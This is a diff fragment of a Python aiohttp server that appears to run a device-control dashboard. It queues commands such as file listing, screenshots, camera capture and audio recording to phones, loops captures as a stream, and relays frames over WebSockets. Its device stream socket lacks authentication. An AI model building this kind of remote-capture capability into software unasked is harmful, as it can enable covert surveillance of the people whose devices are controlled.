+   752→   752→    
+   753→   753→    device = await store.get_user_device(session['user_id'], device_id)
+   754→   754→    if not device:
+   755→   755→        return json_response({"ok": False, "message": "Device not found"}, 404)
+   756→   756→    
+   757→   757→    queued = await store.queue_command(
+   758→   758→        device_id=device_id,
+   759→   759→        command="list_files",
+   760→   760→        params={"path": path},
+   761→   761→        requested_by=session['user_id'],
+   762→   762→        source="web"
+   763→   763→    )
+   764→   764→    
+   765→   765→    if firebase_connected:
+   766→   766→        await push_command(device_id, {
+   767→   767→            "id": queued['id'],
+   768→   768→            "command": "list_files",
+   769→   769→            "params": {"path": path},
+   770→   770→            "created_at": queued['created_at'],
+   771→   771→        })
+   772→   772→    
+   773→   773→    return json_response({"ok": True, "command": queued, "message": "Command queued"})
+   774→   774→
+   775→   775→
+   776→   776→# ─── Streaming API ────────────────────────────────────────────
+   777→   777→
+   778→   778→async def api_stream_frame(request: web.Request) -> web.Response:
+   779→   779→    session = get_auth_session(request)
+   780→   780→    if not session:
+   781→   781→        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+   782→   782→    
+   783→   783→    device_id = request.match_info.get('device_id', '')
+   784→   784→    stream_type = request.query.get('type', 'video')
+   785→   785→    key = f"{device_id}:{stream_type}"
+   786→   786→    
+   787→   787→    frame = store.latest_frames.get(key)
+   788→   788→    if not frame:
+   789→   789→        return json_response({"ok": False, "message": "No frame available"}, 404)
+   790→   790→    
+   791→   791→    return json_response({
+   792→   792→        "ok": True,
+   793→   793→        "data": frame.get('data', ''),
+   794→   794→        "timestamp": frame.get('timestamp', 0),
+   795→   795→        "source": frame.get('source', ''),
+   796→   796→    })
+   797→   797→
+   798→   798→
+   799→   799→async def api_stream_status(request: web.Request) -> web.Response:
+   800→   800→    session = get_auth_session(request)
+   801→   801→    if not session:
+   802→   802→        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+   803→   803→    
+   804→   804→    streams = {}
+   805→   805→    for key, info in store.jpeg_stream_info.items():
+   806→   806→        if info.get('active'):
+   807→   807→            streams[key] = info
+   808→   808→    
+   809→   809→    return json_response({"ok": True, "streams": streams})
+   810→   810→
+   811→   811→
+   812→   812→async def api_stream_start(request: web.Request) -> web.Response:
+   813→   813→    """Device notifies server that a stream started."""
+   814→   814→    device_id, error = get_device_auth(request)
+   815→   815→    if error:
+   816→   816→        return json_response({"ok": False, "message": error}, 401)
+   817→   817→    
+   818→   818→    try:
+   819→   819→        body = await request.json()
+   820→   820→    except:
+   821→   821→        body = {}
+   822→   822→    
+   823→   823→    stream_id = body.get('stream_id', '')
+   824→   824→    stream_type = body.get('type', 'screen')
+   825→   825→    
+   826→   826→    store.jpeg_stream_info[device_id] = {
+   827→   827→        "active": True,
+   828→   828→        "type": stream_type,
+   829→   829→        "stream_id": stream_id,
+   830→   830→        "started_at": datetime.utcnow().isoformat(),
+   831→   831→    }
+   832→   832→    
+   833→   833→    return json_response({"ok": True})
+   834→   834→
+   835→   835→
+   836→   836→async def api_stream_stop(request: web.Request) -> web.Response:
+   837→   837→    """Device notifies server that a stream stopped."""
+   838→   838→    device_id, error = get_device_auth(request)
+   839→   839→    if error:
+   840→   840→        return json_response({"ok": False, "message": error}, 401)
+   841→   841→    
+   842→   842→    if device_id in store.jpeg_stream_info:
+   843→   843→        store.jpeg_stream_info[device_id]['active'] = False
+   844→   844→    
+   845→   845→    return json_response({"ok": True})
+   846→   846→
+   847→   847→
+   848→   848→async def api_jpeg_stream_start(request: web.Request) -> web.Response:
+   849→   849→    """Start JPEG screenshot-based streaming (web/admin)."""
+   850→   850→    session = get_auth_session(request)
+   851→   851→    if not session:
+   852→   852→        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+   853→   853→    
+   854→   854→    try:
+   855→   855→        body = await request.json()
+   856→   856→    except:
+   857→   857→        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
+   858→   858→    
+   859→   859→    device_id = body.get('device_id', '')
+   860→   860→    stream_type = body.get('type', 'screen')
+   861→   861→    interval = body.get('interval', JPEG_STREAM_INTERVAL)
+   862→   862→    
+   863→   863→    if not device_id:
+   864→   864→        return json_response({"ok": False, "message": "Missing device_id"}, 400)
+   865→   865→    
+   866→   866→    # Check if already streaming
+   867→   867→    if device_id in store.jpeg_stream_tasks and not store.jpeg_stream_tasks[device_id].done():
+   868→   868→        return json_response({"ok": False, "message": "Stream already active"}, 400)
+   869→   869→    
+   870→   870→    # Start JPEG stream loop
+   871→   871→    async def jpeg_loop():
+   872→   872→        cmd = "screenshot" if stream_type == "screen" else "front_camera"
+   873→   873→        if stream_type == "back_camera":
+   874→   874→            cmd = "back_camera"
+   875→   875→        elif stream_type == "audio":
+   876→   876→            cmd = "record_audio"
+   877→   877→        
+   878→   878→        store.jpeg_stream_info[device_id] = {
+   879→   879→            "active": True,
+   880→   880→            "type": stream_type,
+   881→   881→            "interval": interval,
+   882→   882→            "started_at": datetime.utcnow().isoformat(),
+   883→   883→            "frame_count": 0,
+   884→   884→        }
+   885→   885→        
+   886→   886→        while store.jpeg_stream_info.get(device_id, {}).get('active', False):
+   887→   887→            try:
+   888→   888→                queued = await store.queue_command(
+   889→   889→                    device_id=device_id,
+   890→   890→                    command=cmd,
+   891→   891→                    params={},
+   892→   892→                    requested_by=session['user_id'],
+   893→   893→                    source="jpeg_stream"
+   894→   894→                )
+   895→   895→                
+   896→   896→                if firebase_connected:
+   897→   897→                    await push_command(device_id, {
+   898→   898→                        "id": queued['id'],
+   899→   899→                        "command": cmd,
+   900→   900→                        "params": {},
+   901→   901→                        "created_at": queued['created_at'],
+   902→   902→                    })
+   903→   903→                
+   904→   904→                store.jpeg_stream_info[device_id]['frame_count'] = \
+   905→   905→                    store.jpeg_stream_info[device_id].get('frame_count', 0) + 1
+   906→   906→                
+   907→   907→                await asyncio.sleep(interval)
+   908→   908→            except asyncio.CancelledError:
+   909→   909→                break
+   910→   910→            except Exception as e:
+   911→   911→                logger.error(f"JPEG stream error: {e}")
+   912→   912→                await asyncio.sleep(5)
+   913→   913→    
+   914→   914→    store.jpeg_stream_tasks[device_id] = asyncio.create_task(jpeg_loop())
+   915→   915→    return json_response({"ok": True, "message": "Stream started"})
+   916→   916→
+   917→   917→
+   918→   918→async def api_jpeg_stream_stop(request: web.Request) -> web.Response:
+   919→   919→    """Stop JPEG streaming."""
+   920→   920→    session = get_auth_session(request)
+   921→   921→    if not session:
+   922→   922→        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+   923→   923→    
+   924→   924→    try:
+   925→   925→        body = await request.json()
+   926→   926→    except:
+   927→   927→        body = {}
+   928→   928→    
+   929→   929→    device_id = body.get('device_id', '')
+   930→   930→    
+   931→   931→    if device_id in store.jpeg_stream_info:
+   932→   932→        store.jpeg_stream_info[device_id]['active'] = False
+   933→   933→    
+   934→   934→    # Send stop command
+   935→   935→    if device_id in store.jpeg_stream_tasks and not store.jpeg_stream_tasks[device_id].done():
+   936→   936→        store.jpeg_stream_tasks[device_id].cancel()
+   937→   937→    
+   938→   938→    return json_response({"ok": True, "message": "Stream stopped"})
+   939→   939→
+   940→   940→
+   941→   941→# ─── WebSocket Handlers ───────────────────────────────────────
+   942→   942→
+   943→   943→async def ws_dashboard(request: web.Request) -> web.Response:
+   944→   944→    """Dashboard real-time updates WebSocket."""
+   945→   945→    token = request.query.get('token', '')
+   946→   946→    session = store.validate_session(token)
+   947→   947→    if not session:
+   948→   948→        return web.Response(status=401, text="Unauthorized")
+   949→   949→    
+   950→   950→    ws = web.WebSocketResponse(heartbeat=30)
+   951→   951→    await ws.prepare(request)
+   952→   952→    store.dashboard_ws_clients.add(ws)
+   953→   953→    
+   954→   954→    try:
+   955→   955→        # Send initial data
+   956→   956→        stats = store.get_stats()
+   957→   957→        devices = await store.get_user_devices(session['user_id'])
+   958→   958→        await ws.send_json({
+   959→   959→            "type": "init",
+   960→   960→            "devices": devices,
+   961→   961→            "stats": stats,
+   962→   962→            "commands": COMMAND_REGISTRY,
+   963→   963→            "categories": CMD_CATEGORIES,
+   964→   964→        })
+   965→   965→        
+   966→   966→        async for msg in ws:
+   967→   967→            if msg.type == WSMsgType.TEXT:
+   968→   968→                if msg.data == "ping":
+   969→   969→                    await ws.send_json({"type": "pong"})
+   970→   970→                elif msg.data == "get_stats":
+   971→   971→                    await ws.send_json({"type": "stats_update", "stats": store.get_stats()})
+   972→   972→            elif msg.type in (WSMsgType.ERROR, WSMsgType.CLOSE):
+   973→   973→                break
+   974→   974→    except Exception:
+   975→   975→        pass
+   976→   976→    finally:
+   977→   977→        store.dashboard_ws_clients.discard(ws)
+   978→   978→    
+   979→   979→    return ws
+   980→   980→
+   981→   981→
+   982→   982→async def ws_stream(request: web.Request) -> web.Response:
+   983→   983→    """Device streaming WebSocket."""
+   984→   984→    device_id = request.query.get('device_id', '')
+   985→   985→    stream_id = request.query.get('stream_id', '')
+   986→   986→    
+   987→   987→    ws = web.WebSocketResponse(heartbeat=10)
+   988→   988→    await ws.prepare(request)
+   989→   989→    
+   990→   990→    key = f"{device_id}:{stream_id}"
+   991→   991→    store.stream_connections[key] = {"ws": ws, "type": "device", "last_activity": time.time()}
+   992→   992→    
+   993→   993→    try:
+   994→   994→        async for msg in ws:
+   995→   995→            if msg.type == WSMsgType.BINARY:
+   996→   996→                # Video/audio frame from device
+   997→   997→                store.latest_frames[f"{device_id}:video"] = {
+   998→   998→                    "data": msg.data if isinstance(msg.data, str) else "",
+   999→   999→                    "timestamp": time.time(),
+  1000→  1000→                    "source": "stream",
+  1001→  1001→                }
+  1002→  1002→                
+  1003→  1003→                # Forward to any viewer
+  1004→  1004→                for conn_key, conn in list(store.stream_connections.items()):
+  1005→  1005→                    if conn.get('type') == 'viewer' and conn.get('target_stream') == stream_id:
+  1006→  1006→                        try:
+  1007→  1007→                            if conn.get('ws') and not conn['ws'].closed:
+  1008→  1008→                                conn['ws'].send_bytes(msg.data)
+  1009→  1009→                        except Exception:
+  1010→  1010→                            pass
+  1011→  1011→                
+  1012→  1012→                store.stream_connections[key]['last_activity'] = time.time()
+  1013→  1013→            
+  1014→  1014→            elif msg.type == WSMsgType.TEXT:
+  1015→  1015→                try:
+  1016→  1016→                    data = json.loads(msg.data)
+  1017→  1017→                    msg_type = data.get('type', '')
+  1018→  1018→                    
+  1019→  1019→                    if msg_type == 'config':
+  1020→  1020→                        store.jpeg_stream_info[device_id] = data
+  1021→  1021→                    
+  1022→  1022→                    elif msg_type == 'frame':
+  1023→  1023→                        # Base64 frame
+  1024→  1024→                        frame_data = data.get('data', '')
+  1025→  1025→                        if frame_data:
+  1026→  1026→                            store.latest_frames[f"{device_id}:video"] = {
+  1027→  1027→                                "data": frame_data,
+  1028→  1028→                                "timestamp": time.time(),
+  1029→  1029→                                "source": data.get('source', 'stream'),
+  1030→  1030→                                "is_keyframe": data.get('is_keyframe', False),
+  1031→  1031→                            }
+  1032→  1032→                            # Forward to viewers
+  1033→  1033→                            for conn_key, conn in list(store.stream_connections.items()):
+  1034→  1034→                                if conn.get('type') == 'viewer' and conn.get('target_stream') == stream_id:
+  1035→  1035→                                    try:
+  1036→  1036→                                        if conn.get('ws') and not conn['ws'].closed:
+  1037→  1037→                                            conn['ws'].send_json(data)
+  1038→  1038→                                    except Exception:
+  1039→  1039→                                        pass
+  1040→  1040→                except json.JSONDecodeError:
+  1041→  1041→                    pass
+  1042→  1042→            
+  1043→  1043→            elif msg.type in (WSMsgType.ERROR, WSMsgType.CLOSE):
+  1044→  1044→                break
+  1045→  1045→    except Exception:
+  1046→  1046→        pass
+  1047→  1047→    finally:
+  1048→  1048→        store.stream_connections.pop(key, None)
+  1049→  1049→        if device_id in store.jpeg_stream_info:
+  1050→  1050→            store.jpeg_stream_info[device_id]['active'] = False
+  1051→  1051→    
+  1052→  1052→    return ws
+  1053→  1053→
+  1054→  1054→
+  1055→  1055→async def ws_stream_viewer(request: web.Request) -> web.Response:
+  1056→  1056→    """Viewer WebSocket for watching streams."""
+  1057→  1057→    stream_id = request.query.get('stream_id', '')
+  1058→  1058→    token = request.query.get('token', '')
+  1059→  1059→    session = store.validate_session(token)
+  1060→  1060→    if not session:
+  1061→  1061→        return web.Response(status=401, text="Unauthorized")
+  1062→  1062→    
+  1063→  1063→    ws = web.WebSocketResponse(heartbeat=10)
+  1064→  1064→    await ws.prepare(request)
+  1065→  1065→    
+  1066→  1066→    key = f"viewer_{stream_id}_{id(ws)}"
+  1067→  1067→    store.stream_connections[key] = {
+  1068→  1068→        "ws": ws,
+  1069→  1069→        "type": "viewer",
+  1070→  1070→        "target_stream": stream_id,
+  1071→  1071→        "last_activity": time.time(),
+  1072→  1072→    }
+  1073→  1073→    
+  1074→  1074→    try:
+  1075→  1075→        async for msg in ws:
+  1076→  1076→            if msg.type == WSMsgType.TEXT:
+  1077→  1077→                try:
+  1078→  1078→                    data = json.loads(msg.data)
+  1079→  1079→                    # Forward control commands to device stream
+  1080→  1080→                    for conn_key, conn in list(store.stream_connections.items()):
+  1081→  1081→                        if conn.get('type') == 'device' and stream_id in conn_key:
+  1082→  1082→                            try:
+  1083→  1083→                                if conn.get('ws') and not conn['ws'].closed:
+  1084→  1084→                                    conn['ws'].send_json(data)
+  1085→  1085→                            except Exception:
+  1086→  1086→                                pass
+  1087→  1087→                except json.JSONDecodeError:
+  1088→  1088→                    pass
+  1089→  1089→            elif msg.type in (WSMsgType.ERROR, WSMsgType.CLOSE):
+  1090→  1090→                break
+  1091→  1091→    except Exception:
+  1092→  1092→        pass
+  1093→  1093→    finally:
+  1094→  1094→        store.stream_connections.pop(key, None)
+  1095→  1095→    
+  1096→  1096→    return ws
+  1097→  1097→
+  1098→  1098→
+  1099→  1099→# ─── Dashboard Push Loop ──────────────────────────────────────
+  1100→  1100→
+  1101→  1101→async def dashboard_push_loop():
+  1102→  1102→    """Push stats updates to connected dashboard WebSockets."""
+  1103→  1103→    while True:
+  1104→  1104→        try:
+  1105→  1105→            await asyncio.sleep(4)
+  1106→  1106→            if not store.dashboard_ws_clients:
+  1107→  1107→                continue
+  1108→  1108→            
+  1109→  1109→            stats = store.get_stats()
+  1110→  1110→            dead = set()
+  1111→  1111→            
+  1112→  1112→            for ws in store.dashboard_ws_clients:
+  1113→  1113→                try:
+  1114→  1114→                    if ws.closed:
+  1115→  1115→                        dead.add(ws)
+  1116→  1116→                        continue
+  1117→  1117→                    await ws.send_json({"type": "stats_update", "stats": stats})
+  1118→  1118→                except Exception:
+  1119→  1119→                    dead.add(ws)
+  1120→  1120→            
+  1121→  1121→            store.dashboard_ws_clients -= dead
+  1122→  1122→        except asyncio.CancelledError:
+  1123→  1123→            break
+  1124→  1124→        except Exception:
+  1125→  1125→            await asyncio.sleep(5)
